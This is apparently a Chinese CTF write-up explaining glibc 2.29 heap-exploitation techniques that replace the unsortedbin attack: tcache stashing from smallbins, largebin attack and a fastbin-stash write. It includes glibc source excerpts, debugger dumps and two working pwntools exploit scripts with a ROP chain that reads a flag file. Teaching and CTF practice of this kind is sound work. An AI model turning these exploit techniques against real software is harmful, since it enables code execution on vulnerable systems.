@@ -1,0 +1,815 @@
+## **前言：**
+
+如今glibc已经发布了glibc
+2.31版本，利用也变得越来越难，主要原因是新的版本中加入了更多的check，不过现在大多数的题目还是基于glibc2.23
+2.27和2.29这3个版本。我们知道，glibc2.29相对于glibc2.23加入了更多的保护措施，而glibc2.29下对unsortedbin的保护措施相当于直接扼杀了unsortedbin
+attack，使其基本成为了过去式。本文将介绍一些glibc2.29下unsortbin attack的代替方法。
+
+##  **回顾**
+
+首先让我们回顾下unsortbin attack
+
+的原理和作用，这里选取了glibc2.23的malloc.c的源码：
+
+    
+    
+    for (;; )
+        {
+          int iters = 0;
+          while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+            {
+              bck = victim->bk;
+              if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
+                  || __builtin_expect (victim->size > av->system_mem, 0))
+                malloc_printerr (check_action, "malloc(): memory corruption",
+                                 chunk2mem (victim), av);
+
+我们可以看到，这里只check了size是否合法，而size一般都会满足条件，所以这个check形同虚设，紧接着的unsortedbin的解链操作：
+
+    
+    
+    /* remove from unsorted list */
+              unsorted_chunks (av)->bk = bck;
+              bck->fd = unsorted_chunks (av);
+
+当将一个 unsorted bin 取出的时候，会在 bck->fd的位置写入 unsorted_chunks (av) 。换句话说，如果我们控制了
+victime->bk的值，我们就能控制bck的值，就能将 unsorted_chunks (av)写到任意地址 。这个值相当的大，我们一般用来攻击
+global_max_fast ，使得更大size的chunk也被视为fastbin，从而进行fastbin
+attack；还有一个非常经典的利用就是house of orange。
+
+接着来看glibc2.29中的源码：
+
+    
+    
+    for (;; )
+        {
+          int iters = 0;
+          while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+            {
+              bck = victim->bk;
+              size = chunksize (victim);
+              mchunkptr next = chunk_at_offset (victim, size);
+    
+              if (__glibc_unlikely (size <= 2 * SIZE_SZ)
+                  || __glibc_unlikely (size > av->system_mem))
+                malloc_printerr ("malloc(): invalid size (unsorted)");
+              if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
+                  || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
+                malloc_printerr ("malloc(): invalid next size (unsorted)");
+              if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
+                malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
+              if (__glibc_unlikely (bck->fd != victim)
+                  || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
+                malloc_printerr ("malloc(): unsorted double linked list corrupted");
+              if (__glibc_unlikely (prev_inuse (next)))
+                malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
+
+我们可以看到glibc 2.29先对于2.23来说对unsorted
+bin加入了更多的check，其中双向链表的完整性检查对我们的利用来说是致命的，这也导致unsorted bin在glibc
+2.29下几乎不可利用，所以我们要寻找一些代替的方法。我们以hitcon2019 quals One-punch-Man这题来实践下方法1和方法2，再以今年某新春公益赛的一题实践下方法3
+
+##  **程序分析**
+
+保护全开，libc版本是2.29，有seccomp：
+
+    
+    
+    ruan@ruan:/mnt/hgfs/shared/hitcon2019/one_punch$ seccomp-tools dump ./one_punch
+     line  CODE  JT   JF      K
+    =================================
+     0000: 0x20 0x00 0x00 0x00000004  A = arch
+     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+     0002: 0x06 0x00 0x00 0x00000000  return KILL
+     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+     0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
+     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
+     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
+     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
+     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
+     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
+     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
+     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
+     0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
+     0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
+     0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+     0024: 0x06 0x00 0x00 0x00000000  return KILL
+
+retire函数里的UAF：
+
+    
+    
+    void retire()
+    {
+      unsigned int v0; // [rsp+Ch] [rbp-4h]
+    
+      writen("idx: ");
+      v0 = get_int();
+      if ( v0 > 2 )
+        error((__int64)"invalid");
+      free((void *)chunks[v0].ptr);
+    }
+
+debut函数会先把我们的输入读入到栈上，然后才复制到申请的堆块中，所以可以利用这来进行rop
+
+    
+    
+    unsigned __int64 __fastcall debut(__int64 a1, __int64 a2)
+    {
+      unsigned int v3; // [rsp+8h] [rbp-418h]
+      signed int v4; // [rsp+Ch] [rbp-414h]
+      char s[1032]; // [rsp+10h] [rbp-410h]
+      unsigned __int64 v6; // [rsp+418h] [rbp-8h]
+    
+      v6 = __readfsqword(0x28u);
+      writen("idx: ");
+      v3 = get_int();
+      if ( v3 > 2 )
+        error((__int64)"invalid");
+      writen("hero name: ");
+      memset(s, 0, 0x400uLL);
+      v4 = read(0, s, 0x400uLL);
+      if ( v4 <= 0 )
+        error((__int64)"io");
+      s[v4 - 1] = 0;
+      if ( v4 <= 0x7F || v4 > 0x400 )
+        error((__int64)"poor hero name");
+      chunks[v3].ptr = (__int64)calloc(1uLL, v4);
+      chunks[v3].sz = v4;
+      strncpy((char *)chunks[v3].ptr, s, v4);
+      memset(s, 0, 0x400uLL);
+      return __readfsqword(0x28u) ^ v6;
+    }
+
+一个后门选项：
+
+    
+    
+    __int64 __fastcall sub_15BB(__int64 a1, __int64 a2)
+    {
+      void *buf; // [rsp+8h] [rbp-8h]
+     if ( *(_BYTE *)(heap_base + 0x20) <= 6 )
+        error((__int64)"gg");
+      buf = malloc(0x217uLL);
+      if ( !buf )
+        error((__int64)"err");
+      if ( read(0, buf, 0x217uLL) <= 0 )
+        error((__int64)"io");
+      puts("Serious Punch!!!");
+      puts(&unk_2128);
+      return puts(buf);
+    }
+
+题目的debut函数用的是calloc函数,意味着进入了tcache的堆块是不会在被取出来了(具体原因可以参考calloc源码)，但是后门函数里用的是malloc，所以我们的目标就是要使得*(_BYTE
+*)(heap_base + 0x20) > 6，已达到利用后门的效果
+
+###  **方法1**
+
+很自然的想到要是能用unsortedbin
+attack就好了，但是这在glibc2.29下是行不通的，原因就是前面分析过的，glibc2.29对unsortedbin进行了全方位的检查。
+
+我后来谷歌了下wp(<https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312>)，找到了一篇wp，里面用的方法有点类似于unsortedbin attack，不得不佩服大佬的思路。
+
+文章里提到的方法是，当从smallbin里申请一个堆块的时候，会把剩下的smallbin也链入相对应大小的tcache，前提是相应大小的tcache没满，相对应的源码为：
+
+    
+    
+    if (in_smallbin_range (nb))
+        {
+          idx = smallbin_index (nb);
+          bin = bin_at (av, idx);
+    
+          if ((victim = last (bin)) != bin)
+            {
+              bck = victim->bk;
+        if (__glibc_unlikely (bck->fd != victim))
+          malloc_printerr ("malloc(): smallbin double linked list corrupted");
+              set_inuse_bit_at_offset (victim, nb);
+              bin->bk = bck;
+              bck->fd = bin;
+    
+              if (av != &main_arena)
+          set_non_main_arena (victim);
+              check_malloced_chunk (av, victim, nb);
+    #if USE_TCACHE
+        /* While we're here, if we see other chunks of the same size,
+           stash them in the tcache.  */
+        size_t tc_idx = csize2tidx (nb);
+        if (tcache && tc_idx < mp_.tcache_bins)
+          {
+            mchunkptr tc_victim;
+    
+            /* While bin not empty and tcache not full, copy chunks over.  */
+            while (tcache->counts[tc_idx] < mp_.tcache_count
+             && (tc_victim = last (bin)) != bin)
+        {// 如果smallbin里相对应大小的tcache没满的话，就链入tcache
+          if (tc_victim != 0)
+            {
+              bck = tc_victim->bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              if (av != &main_arena)
+          set_non_main_arena (tc_victim);
+              bin->bk = bck;
+              bck->fd = bin;
+    
+              tcache_put (tc_victim, tc_idx);
+                  }
+        }
+          }
+    #endif
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+            }
+        }
+
+此处是没有对smallbin进行check的：
+
+    
+    
+    if (tc_victim != 0)
+            {
+              bck = tc_victim->bk;
+              set_inuse_bit_at_offset (tc_victim, nb);
+              if (av != &main_arena)
+          set_non_main_arena (tc_victim);
+              bin->bk = bck;
+              bck->fd = bin;
+
+所以我们可以伪造tc_victim->bk,然后到了bck->fd=bin这一句，就可以向一个地址写入一个libc的值了，类似于unsortedbin
+attack,要注意的话就是相对应大小的tcache
+bin为6个，这样的话tcache_put后，就会退出循环(tcache相同size的chunk最多7个)，把chunk返回，不会造成段错误
+
+这里还有个大问题，就是程序申请的堆块大小范围在0x7f~0x400之间，所以在tcache没满的情况下，free后都会进入tcache,那要怎么让一个大小的堆块，比如0x100大小的堆块，相对应的tcache
+bin有6块，而smallbin有两块呢，这里用到了last_remainder：
+
+    
+    
+    if (in_smallbin_range (nb) &&
+                  bck == unsorted_chunks (av) &&
+                  victim == av->last_remainder &&
+                  (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
+                {
+                  /* split and reattach remainder */
+                  remainder_size = size - nb;
+                  remainder = chunk_at_offset (victim, nb);
+                  unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
+                  av->last_remainder = remainder;
+                  remainder->bk = remainder->fd = unsorted_chunks (av);
+                  if (!in_smallbin_range (remainder_size))
+                    {
+                      remainder->fd_nextsize = NULL;
+                      remainder->bk_nextsize = NULL;
+                    }
+    
+                  set_head (victim, nb | PREV_INUSE |
+                            (av != &main_arena ? NON_MAIN_ARENA : 0));
+                  set_head (remainder, remainder_size | PREV_INUSE);
+                  set_foot (remainder, remainder_size);
+    
+                  check_malloced_chunk (av, victim, nb);
+                  void *p = chunk2mem (victim);
+                  alloc_perturb (p, bytes);
+                  return p;
+                }
+    
+    
+
+比如我们把unsortedbin切成0x100的大小，如果在calloc一个比这个大的chunk,那这个unsortedbin就会被放到相对应大小的smallbin，对应的源码为：
+
+    
+    
+    /* place chunk in bin */
+    
+              if (in_smallbin_range (size))
+                {
+                  victim_index = smallbin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+                }
+              else
+                {
+                  victim_index = largebin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+
+这样的话一切条件都有了 :P
+
+还有一点要注意的是，我们用这个方法把heap+0x30的地方改写了，这样的话其实tcache会 corrupt 掉：
+
+    
+    
+    pwndbg> bins
+    tcachebins
+    0x100 [  7]: 0x563a59056000 —▸ 0x563a59053760 —▸ 0x563a59053660 —▸ 0x563a59053560 —▸ 0x563a59053460 —▸ 0x563a59053360 —▸ 0x563a59053260 ◂— 0x0
+    0x1d0 [-112]: 0x0
+    0x1e0 [-19]: 0x0
+    0x1f0 [-41]: 0x0
+    0x200 [-45]: 0x0
+    0x210 [-99]: 0x0
+    0x220 [125]: 0x0
+    0x410 [  7]: 0x563a590550c0 —▸ 0x563a59054cb0 —▸ 0x563a590548a0 —▸ 0x563a59054490 —▸ 0x563a59054080 —▸ 0x563a59053c70 —▸ 0x563a59053860 ◂— 0x0
+
+所以我们要在攻击前先申请一个0x217大小的堆块，然后释放掉，在攻击
+
+exp为：
+
+    
+    
+    from pwn import *
+    
+    context.arch = 'amd64'
+    
+    def debug(addr,PIE=True):
+      if PIE:
+        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
+        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
+      else:
+        gdb.attach(p,"b *{}".format(hex(addr)))
+    
+    
+    def cmd(c):
+      p.recvuntil("> ")
+      p.sendline(str(c))
+    
+    def add(idx,name):
+      cmd(1)
+      p.recvuntil("idx: ")
+      p.sendline(str(idx))
+      p.recvuntil("name: ")
+      p.send(name)
+    def dele(idx):
+      cmd(4)
+      p.recvuntil("idx: ")
+      p.sendline(str(idx))
+    
+    def show(idx):
+      cmd(3)
+      p.recvuntil("idx: ")
+      p.sendline(str(idx))
+    
+    def edit(idx,name):
+      cmd(2)
+      p.recvuntil("idx: ")
+      p.sendline(str(idx))
+      p.recvuntil("name: ")
+      p.send(name)
+    
+    def main(host,port=26976):
+      global p
+      if host:
+        p = remote(host,port)
+      else:
+        p = process("./one_punch")
+        # debug(0x0000000000015BB)
+        # gdb.attach(p)
+      for i in range(2):
+        add(i,"A"*0xf8)
+      dele(0)
+      dele(1)
+      show(1)
+      p.recvuntil(": ")
+      heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x260
+      for i in range(4):
+        add(0,"A"*0xf8)
+        dele(0)
+      for i in range(7):
+        add(0,"A"*0x400)
+        dele(0)
+      for i in range(2):
+        add(i,"A"*0x400)
+      dele(0)
+      show(0)
+      p.recvuntil(": ")
+      libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0
+      info("heap : " + hex(heap))
+      info("libc : " + hex(libc.address))
+      add(1,"A"*0x300)
+      add(2,"A"*0x400)
+      add(1,"A"*0x400)
+      dele(2)
+      add(1,"A"*0x300)
+      add(1,"A"*0x400)
+      add(0,"A"*0x217)
+      payload = b"\x00"*0x108+b"/flag.txt"+b"\x00"*(0x7+0x1f0)+p64(0x101)+p64(heap+0x27d0)+p64(heap+0x30-0x10-5)
+      edit(2,payload)
+      dele(0)
+      add(2,"A"*0xf8)
+      edit(0,p64(libc.symbols["__malloc_hook"]))
+      cmd(str(50056))
+      p.send("C"*8)
+      cmd(str(50056))
+      p.send(p64(libc.address+0x000000000008cfd6))
+      # pause()
+      # 0x000000000008cfd6: add rsp, 0x48; ret;
+      # 0x0000000000026542: pop rdi; ret;
+      # 0x000000000012bdc9: pop rdx; pop rsi; ret;
+      # 0x0000000000047cf8: pop rax; ret;
+      # 0x00000000000cf6c5: syscall; ret;
+      p_rdi = 0x0000000000026542+libc.address
+      p_rdx_rsi = 0x000000000012bdc9+libc.address
+      p_rax = 0x0000000000047cf8+libc.address
+      syscall_ret = 0x00000000000cf6c5+libc.address
+      payload = p64(p_rdi)+p64(heap+0x2df8)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall_ret)
+      payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x80)+p64(heap+0x2d00)+p64(p_rax)+p64(0)+p64(syscall_ret)
+      payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall_ret)
+      payload += p64(p_rdi)+p64(0)+p64(p_rax)+p64(0)+p64(syscall_ret)
+      payload = payload.ljust(0x100,b"\x00")
+      gdb.attach(p)
+      add(2,payload)
+      p.interactive()
+    
+    if __name__ == "__main__":
+      libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
+      main(args['REMOTE'])
+
+###  **方法2**
+
+方法2是Balsn战队的wp(<https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#one-punch-man>)里用到的largebin_attack,首先我觉得一个难点是这题申请的堆块最大为0x410，怎么把大小比0x410还大的unsortedbin放入largebin是第一个要解决的问题，所以从源码入手：
+
+    
+    
+    /*
+                 If a small request, try to use last remainder if it is the
+                 only chunk in unsorted bin.  This helps promote locality for
+                 runs of consecutive small requests. This is the only
+                 exception to best-fit, and applies only when there is
+                 no exact fit for a small chunk.
+               */
+    
+              if (in_smallbin_range (nb) &&
+                  bck == unsorted_chunks (av) &&
+                  victim == av->last_remainder &&
+                  (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
+                {
+                  /* split and reattach remainder */
+                  remainder_size = size - nb;
+    
+
+这是判断是否要把last remainder进行切割的代码，如果条件不满足的话就会进入下面的代码：
+
+    
+    
+    /* remove from unsorted list */
+              if (__glibc_unlikely (bck->fd != victim))
+                malloc_printerr ("malloc(): corrupted unsorted chunks 3");
+              unsorted_chunks (av)->bk = bck;
+              bck->fd = unsorted_chunks (av);
+    
+              /* Take now instead of binning if exact fit */
+        //我们使得size != nb，跳过这个代码块
+              if (size == nb)
+                {
+                  set_inuse_bit_at_offset (victim, size);
+                  if (av != &main_arena)
+        set_non_main_arena (victim);
+    .........................................................
+        }
+    #endif
+                }
+    
+              /* place chunk in bin */
+    
+              if (in_smallbin_range (size))
+                {
+                  victim_index = smallbin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+                }
+              else
+                {// 将chunk置入largebin
+                  victim_index = largebin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+
+所以wp里的堆布局为：
+
+![1.png](https://image.3001.net/images/20210719/1626663767_60f4eb57ddb9c07ed83b5.png!small)
+
+这样当我们malloc(0x200)的堆块时，就会不满足bck == unsorted_chunks (av)和if (size ==
+nb)从而把这个chunk(0x5601e80414c0)置入largebin中,第二次循环的时候，发现unsorted
+bin的size刚刚好，直接就取出返回
+
+    
+    
+    largebins
+    0x400: 0x5601e80414c0 —▸ 0x7f58e3c64090 (main_arena+1104)  ◂— 0x5601e80414c0
+
+这样的话就解决了这个问题，剩下的就是怎么进行largebin_attack了，原理为：
+
+    
+    
+    if (in_smallbin_range (size))
+                {
+                  victim_index = smallbin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+                }
+              else  //要放入的chunk是largebin
+                {
+                  victim_index = largebin_index (size);
+                  bck = bin_at (av, victim_index);
+                  fwd = bck->fd;
+    
+                  /* maintain large bins in sorted order */
+                  if (fwd != bck)
+                    {
+                      /* Or with inuse bit to speed comparisons */
+                      size |= PREV_INUSE;
+                      /* if smaller than smallest, bypass loop below */
+                      assert (chunk_main_arena (bck->bk));
+                      if ((unsigned long) (size)
+              < (unsigned long) chunksize_nomask (bck->bk))
+                        {
+                          fwd = bck;
+                          bck = bck->bk;
+    
+                          victim->fd_nextsize = fwd->fd;
+                          victim->bk_nextsize = fwd->fd->bk_nextsize;
+                          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+                        }
+                      else
+                        {
+                          assert (chunk_main_arena (fwd));
+                          while ((unsigned long) size < chunksize_nomask (fwd))
+                            {
+                              fwd = fwd->fd_nextsize;
+            assert (chunk_main_arena (fwd));
+                            }
+    
+                          if ((unsigned long) size
+            == (unsigned long) chunksize_nomask (fwd))
+                            /* Always insert in the second position.  */
+                            fwd = fwd->fd;
+                          else  //原本在largebin（fwd）的size和要放入的largebin（victim）的size不等
+                            {
+                              victim->fd_nextsize = fwd;
+                              victim->bk_nextsize = fwd->bk_nextsize;
+                              fwd->bk_nextsize = victim;  //!!!!
+                              victim->bk_nextsize->fd_nextsize = victim;
+                            }
+                          bck = fwd->bk;
+                        }
+                    }
+                  else
+                    victim->fd_nextsize = victim->bk_nextsize = victim;
+                }
+    
+              mark_bin (av, victim_index);
+              victim->bk = bck;
+              victim->fd = fwd;
+              fwd->bk = victim;
+              bck->fd = victim;
+
+所以我们可以利用程序里的UAF漏洞伪造好fwd->bk_nextsize，随后的victim->bk_nextsize->fd_nextsize =
+victim；就会在fwd->bk_nextsize+0x20的位置写入victim这个值，如果我们让这个堆地址写入到heap_base+0x20的位置就能使用后门函数了，这里要注意的一个点就是待插入的chunk的size要和已经在largebin里的chunk的size不相等。
+
+来看看效果：把unsortedbin放入largebin之前
+
+![2.png](https://image.3001.net/images/20210719/1626663770_60f4eb5a62a5851b59fa0.png!small)
+
+放入后（这里的堆基地址为0x565505852000）
+
+![3.png](https://image.3001.net/images/20210719/1626663771_60f4eb5b29615b4189582.png!small)
+
+可以看到0x220大小的chunk被改为了有48个，这样我们就可以利用后门函数申请到__malloc_hook了
+
+具体的exp见 <https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#one-punch-man>
+
+### **方法3**
+
+方法3是在打今年某公益ctf的时候学到的，题目名字叫signin
+
+程序逻辑很短，只能add10次：
+
+  
+
+![222.jpg](https://image.3001.net/images/20210719/1626663771_60f4eb5beb4b3a840ca24.jpg!small)
+
+dele后flags会置零，但指针没置零，故可以UAF：
+
+![333.jpg](https://image.3001.net/images/20210719/1626663772_60f4eb5c7ac5463d8029f.jpg!small)
+
+但是不能double free，因为glibc2.29在free tcache的时候会对tcache进行check：
+
+    
+    
+    /* This test succeeds on double free.  However, we don't 100%
+         trust it (it also matches random payload data at a 1 in
+         2^<size_t> chance), so verify it's not an unlikely
+         coincidence before aborting.  */
+      if (__glibc_unlikely (e->key == tcache))
+        {
+          tcache_entry *tmp;
+          LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+          for (tmp = tcache->entries[tc_idx];
+         tmp;
+         tmp = tmp->next)
+            if (tmp == e)
+        malloc_printerr ("free(): double free detected in tcache 2");
+          /* If we get here, it was a coincidence.  We've wasted a
+             few cycles, but don't abort.  */
+        }
+
+还有就是仅有的一次edit机会和一个后门，不过后门要满足bss段中的ptr不为零：
+
+![444.jpg](https://image.3001.net/images/20210719/1626663773_60f4eb5d12367832782f0.jpg!small)
+
+这里一开始想到的也是unsortedbin
+attack，如果能攻击到bss段中的ptr，那我们就能getshell了，但是这题申请的堆块固定了是0x70，故也就不能利用unsortedbin
+attack
+
+我们可以看到这个backdoor函数很诡异，为什么要平白无故调用一个calloc，然后又想到程序限制了申请的堆块大小为0x70，是在fastbin的范围里，顺着这两点，去看源码，最后找到了利用点：
+
+    
+    
+    static void *
+    _int_malloc (mstate av, size_t bytes)
+    {
+      ...............................
+    #if USE_TCACHE
+      size_t tcache_unsorted_count;      /* count of unsorted chunks processed */
+    #endif
+      checked_request2size (bytes, nb);
+    
+      /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
+         mmap.  */
+     .....................................................
+      /*
+         If the size qualifies as a fastbin, first check corresponding bin.
+         This code is safe to execute even if av is not yet initialized, so we
+         can try it without checking, which saves some time on this fast path.
+       */
+    ...................................        
+    
+      if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
+        {
+          idx = fastbin_index (nb);
+          mfastbinptr *fb = &fastbin (av, idx);
+          mchunkptr pp;
+          victim = *fb;
+    
+          if (victim != NULL)
+      {
+        if (SINGLE_THREAD_P)
+          *fb = victim->fd;
+        else
+          REMOVE_FB (fb, pp, victim);
+        if (__glibc_likely (victim != NULL))
+          {
+            size_t victim_idx = fastbin_index (chunksize (victim));
+            if (__builtin_expect (victim_idx != idx, 0))
+        malloc_printerr ("malloc(): memory corruption (fast)");
+            check_remalloced_chunk (av, victim, nb);
+    #if USE_TCACHE
+            /* While we're here, if we see other chunks of the same size,
+         stash them in the tcache.  */
+            size_t tc_idx = csize2tidx (nb);
+            if (tcache && tc_idx < mp_.tcache_bins)
+        {
+          mchunkptr tc_victim;
+    
+          /* While bin not empty and tcache not full, copy chunks.  */
+          while (tcache->counts[tc_idx] < mp_.tcache_count
+           && (tc_victim = *fb) != NULL)
+            {
+              if (SINGLE_THREAD_P)
+          *fb = tc_victim->fd;
+              else
+          {
+            REMOVE_FB (fb, pp, tc_victim);
+            if (__glibc_unlikely (tc_victim == NULL))
+              break;
+          }
+              tcache_put (tc_victim, tc_idx);
+            }
+        }
+    #endif
+
+我们可以看到这句注释:/* While bin not empty and tcache not full, copy chunks.
+*/，应该是fastbin再取下一块之后，如果fastbin还有剩余，而且对应大小的tcache没满，就把它放到对应大小的tcache，而且这里没有任何检查，在跟进去tcache_put：
+
+    
+    
+    tcache_put (mchunkptr chunk, size_t tc_idx)
+    {
+      tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+      assert (tc_idx < TCACHE_MAX_BINS);
+    
+      /* Mark this chunk as "in the tcache" so the test in _int_free will
+         detect a double free.  */
+      e->key = tcache;
+    
+      e->next = tcache->entries[tc_idx];
+      tcache->entries[tc_idx] = e;
+      ++(tcache->counts[tc_idx]);
+    }
+
+这有句e->key = tcache;这是为了检查tcache的double free，如果我们伪造了那个fastbin
+chunk,我们就可以往chunk+0x18的位置写入tcache的值，效果和原来的unsortedbin attack很像。效果：
+
+    
+    
+    pwndbg> bins
+    tcachebins
+    0x80 [  6]: 0x21c84e0 —▸ 0x21c8460 —▸ 0x21c83e0 —▸ 0x21c8360 —▸ 0x21c82e0 —▸ 0x21c8260 ◂— 0x0
+    fastbins
+    0x20: 0x0
+    0x30: 0x0
+    0x40: 0x0
+    0x50: 0x0
+    0x60: 0x0
+    0x70: 0x0
+    0x80: 0x21c8650 —▸ 0x4040a8 ◂— 0xffffffff00000000
+
+调用calloc后：
+
+    
+    
+    pwndbg> bins
+    tcachebins
+    0x80 [  7]: 0x4040b8 (completed) —▸ 0x21c84e0 —▸ 0x21c8460 —▸ 0x21c83e0 —▸ 0x21c8360 —▸ 0x21c82e0 —▸ 0x21c8260 ◂— 0x0
+    pwndbg> telescope 0x4040b8+8
+    00:0000│   0x4040c0 (ptr) —▸ 0x21c8010 ◂— 0x7000000000000
+    01:0008│   0x4040c8 ◂— 0x0
+
+成功把tcache写入ptr，这也是为什么后门函数在一开始会有个诡异的calloc，顺带一提的是calloc不会使用tcache里的堆块
+
+exp：
+
+    
+    
+    from pwn import *
+    
+    context.arch = 'amd64'
+    
+    def cmd(c):
+      p.recvuntil("your choice?")
+      p.sendline(str(c))
+    
+    def add(idx):
+      cmd(1)
+      p.recvuntil("idx?")
+      p.sendline(str(idx))
+    def dele(idx):
+      cmd(3)
+      p.recvuntil("idx?")
+      p.sendline(str(idx))
+    def edit(idx,content):
+      cmd(2)
+      p.recvuntil("idx?")
+      p.send(str(idx).ljust(0xf,"\x00"))
+      p.send(content)
+    
+    def main(host,port=4205):
+      global p
+      if host:
+        p = remote(host,port)
+      else:
+        p = process("./pwn")
+        gdb.attach(p,"b *0x000000000401343")
+        # gdb.attach(p)
+      for i in range(9):
+        add(i)
+      for i in range(9):
+        dele(i)
+      edit(8,p64(0x0000000004040C0-0x18))
+      add(1)
+      cmd(6)
+      p.interactive()
+    
+    if __name__ == "__main__":
+      # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
+      # elf = ELF("./re-alloc",checksec=False)
+      main(args['REMOTE'])
+
+ **后记**
+
+3种方法都介绍完毕了，这里在提一下glibc源码调试，这对我们解决题目有很大的帮助：
+
+先下载一个Ubuntu19.04，用VMware装上，或者用docker去pull一个Ubuntu19.04的镜像
+
+接着![555.jpg](https://image.3001.net/images/20210719/1626663773_60f4eb5d808f282e6e400.jpg!small)
+
+搞好后，在程序运行时gdb贴上去/usr/src/glibc/glibc-2.29/是源码目录，然后后面的文件夹要自己指定下，比如我想源码调试malloc里的函数：![666.jpg](https://image.3001.net/images/20210719/1626663774_60f4eb5e0172dfef5a899.jpg!small)
+
+效果：
+
+![4.png](https://image.3001.net/images/20210719/1626663774_60f4eb5eb913761085536.png!small)
+
+![5.png](https://image.3001.net/images/20210719/1626663775_60f4eb5f712447413770e.png!small)
+
+如果没敲directory
+/usr/src/glibc/glibc-2.29/malloc，就不会出现相对应的源码，个人觉得还是挺方便的，特别是涉及到chunk分配的时候，看着相对应的源码一行一行的debug，体验很好。
+
+####  **实验推荐==[CTF-PWN练习之精确覆盖变量数据
+](http://hetianlab.com/expc.do?ec=ECID172.19.104.182014110113362900001&pk_campaign=freebuf-wemedia)**
+
